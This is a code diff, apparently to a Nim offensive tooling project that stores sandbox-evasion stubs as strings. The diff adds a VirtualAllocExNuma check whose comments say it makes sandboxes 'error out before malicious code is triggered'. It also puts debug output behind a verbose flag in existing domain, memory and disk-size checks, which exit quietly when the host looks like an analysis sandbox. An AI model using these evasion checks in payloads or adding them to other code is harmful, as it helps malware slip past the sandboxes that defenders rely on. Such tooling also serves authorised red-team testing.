@@ -26,6 +26,32 @@ MyGetDiskFreeSpaceExA = cast[GetDiskFreeSpaceExA_t](get_function_address(cast[HM
 
 """
 
+let VirtualAlloxExNumaCheckStub * = """
+from bitops import bitor
+# Stolen from @chvancooten
+# Try to evade sandboxes by calling an obscure API and checking the result
+# Some sandboxes do not emulate this API, causing it to error out before malicious code is triggered
+proc obscureApi*(): void =
+    let 
+        mem = VirtualAllocExNuma(GetCurrentProcess(), NULL,
+            0x1000, bitor(MEM_COMMIT, MEM_RESERVE),
+            PAGE_EXECUTE_READ, 0)
+
+    if isNil(mem):
+        # Sandbox alert! ;)
+        when defined(verbose):
+            echo obf("[-] ERROR: I don't trust this here environment... Goodbye!")
+        quit(1)
+    
+    # We good otherwise
+    when defined(verbose):
+        echo obf("[*] We don't appear to be in a sandbox")
+
+when isMainModule:
+    obscureApi()
+
+"""
+
 let DomainCheckStub * = """
 
 # code modified from here -> https://github.com/rominf/nim-hostname/blob/d517210adedf7f6c708393ddd20fd7a93504f262/src/hostname.nim
@@ -54,7 +80,8 @@ proc getDomain*(): string =
     else:
         let success = GetComputerNameExA(ComputerNameDnsDomain,result.cstring, resultLen.addr) != 0
   if not success:
-      echo obf("Failed to get Domain")
+      when defined(verbose):
+        echo obf("Failed to get Domain")
   result.setLen(resultLen)
 
 """
@@ -84,7 +111,8 @@ proc MemoryCheck*(): bool =
 
 when isMainModule:
     if (MemoryCheck() == false):
-        echo obf("Not enough memory")
+        when defined(verbose):
+            echo obf("Not enough memory")
         quit()
 
 """
@@ -110,7 +138,8 @@ proc DiskSizeCheck*(): bool =
     else:
         success = GetDiskFreeSpaceEx("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
     result = float(uliTotal.QuadPart) / float((1024*1024*1024))
-    #echo "Size in GB: " & $result
+    when defined(verbose):
+        echo "Size in GB: " & $result
     if(result >= 200):
         gofurther = true
         return gofurther
@@ -119,7 +148,8 @@ proc DiskSizeCheck*(): bool =
 
 when isMainModule:
     if (DiskSizeCheck() == false):
-        echo obf("Disk too small")
+        when defined(verbose):
+            echo obf("Disk too small")
         quit()
 
 """
@@ -169,5 +199,6 @@ try:
 except:
     quit()
 finally:
-    echo ""
+    when defined(verbose):
+        echo ""
 """
